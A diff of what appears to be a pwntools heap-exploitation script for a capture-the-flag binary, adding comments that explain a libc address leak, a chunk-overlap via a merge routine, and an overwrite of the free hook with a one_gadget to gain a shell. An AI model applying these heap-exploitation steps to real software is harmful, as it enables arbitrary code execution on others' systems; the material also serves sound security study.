@@ -60,8 +60,10 @@ for i in range(8):
 
 for i in range(1, 8):
     free(i)
+
 free(0)
 
+# fd -> "a"*8 -> leak bk
 add(0x8, b"a" * 8)
 show(0)
 libc.address = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - 0x3ebd20
@@ -84,6 +86,7 @@ free(5)
 free(7)
 free(8)
 
+# merge 2 chunks -> strcat/strcpy -> overlap
 merge(2, 3)
 
 ddebug()
@@ -93,7 +96,7 @@ add(0x100, payload)
 
 add(0x20, "aaaa")
 add(0x20, "aaaa")
-add(0x20, p64(one_gadget))
+add(0x20, p64(one_gadget)) # free_hook -> onegadget
 
 free(9)
 
